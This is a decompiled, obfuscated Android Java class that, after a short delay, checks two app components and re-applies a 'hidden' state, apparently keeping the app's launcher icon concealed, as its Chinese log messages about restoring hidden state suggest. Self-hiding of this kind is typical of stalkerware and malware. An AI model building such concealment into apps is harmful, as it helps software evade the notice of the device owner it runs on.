package com.storm.safe.rock.service.modules;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.fxsnugkm$initialize$1", m214403f = "fxsnugkm.kt", m214404l = {98}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class fxsnugkm$initialize$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f53600a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0328b3 f53601a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public fxsnugkm$initialize$1(C0328b3 c0328b3, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53601a2 = c0328b3;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new fxsnugkm$initialize$1(this.f53601a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((fxsnugkm$initialize$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0328b3 c0328b3 = this.f53601a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f53600a1;
        try {
            if (i == 0) {
                kg1.m213544f4(obj);
                this.f53600a1 = 1;
                if (b81.m210571b1(2000L, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
            }
            PackageManager packageManager = c0328b3.f53190a3;
            boolean z = false;
            try {
                boolean z2 = packageManager.getComponentEnabledSetting(c0328b3.f53192a5) == 2;
                ComponentName componentNameM211756a0 = c0328b3.m211756a0();
                if (componentNameM211756a0 == null) {
                    z = z2;
                } else {
                    boolean z3 = packageManager.getComponentEnabledSetting(componentNameM211756a0) == 1;
                    if (z2 && z3) {
                        z = true;
                    }
                }
            } catch (Exception unused) {
            }
            if (z) {
                t60.m214714d6("fxsnugkm", "组件状态已正确，跳过重复切换");
            } else {
                c0328b3.m211758a2(true);
                t60.m214714d6("fxsnugkm", "组件状态不一致，已修复");
            }
        } catch (Exception e) {
            t60.m214705c6("fxsnugkm", "恢复隐藏状态失败", e);
        }
        return C1351vv.f60710b1;
    }
}
